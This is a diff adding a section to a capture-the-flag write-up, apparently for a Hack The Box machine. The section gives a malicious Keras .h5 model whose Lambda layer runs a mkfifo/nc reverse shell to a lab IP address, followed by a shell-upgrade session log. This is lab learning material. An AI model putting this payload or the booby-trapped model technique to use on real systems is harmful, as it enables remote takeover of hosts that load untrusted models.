@@ -620,3 +620,96 @@ Enter pass phrase for RootCA.key: password
 └─$ cat match.sorcery.htb.key match.sorcery.htb.crt > match.sorcery.htb.pem
 ```
 {% endcode %}
+
+***
+
+## TENSFLOW .H5 RCE PYTHON EXPLOIT
+
+```
+import tensorflow as tf
+
+def exploit(x):
+    import os
+    os.system("touch /tmp/pwned")
+    return x
+
+model = tf.keras.Sequential()
+model.add(tf.keras.layers.Input(shape=(64,)))
+model.add(tf.keras.layers.Lambda(exploit))
+model.compile()
+model.save("exploit.h5")
+```
+
+This is very similar looking to the code from the website:
+
+```
+import numpy as np
+import pandas as pd
+import tensorflow as tf
+from tensorflow import keras
+from tensorflow.keras import layers
+
+np.random.seed(42)
+
+# Create hourly data for a week
+hours = np.arange(0, 24 * 7)
+profits = np.random.rand(len(hours)) * 100
+
+# Create a DataFrame
+data = pd.DataFrame({
+    'hour': hours,
+    'profit': profits
+})
+
+X = data['hour'].values.reshape(-1, 1)
+y = data['profit'].values
+
+# Build the model
+model = keras.Sequential([
+    layers.Dense(64, activation='relu', input_shape=(1,)),
+    layers.Dense(64, activation='relu'),
+    layers.Dense(1)
+])
+
+# Compile the model
+model.compile(optimizer='adam', loss='mean_squared_error')
+
+# Train the model
+model.fit(X, y, epochs=100, verbose=1)
+
+# Save the model
+model.save('profits_model.h5')
+```
+
+```python
+import tensorflow as tf
+
+def exploit(x):
+    import os
+    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.123 4444 >/tmp/f")
+    return x
+
+model = tf.keras.Sequential()
+model.add(tf.keras.layers.Input(shape=(64,)))
+model.add(tf.keras.layers.Lambda(exploit))
+model.compile()
+model.save("exploit.h5")
+
+```
+
+***
+
+## Upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q)
+
+```
+app@artificial:~$ script /dev/null -c bash
+Script started, file is /dev/null
+app@artificial:~$ ^Z
+[1]+  Stopped                 sudo nc -lnvp 443
+oxdf@hacky$ stty raw -echo; fg
+sudo nc -lnvp 443
+                 ‍reset
+reset: unknown terminal type unknown
+Terminal type? screen
+app@artificial:~$
+```
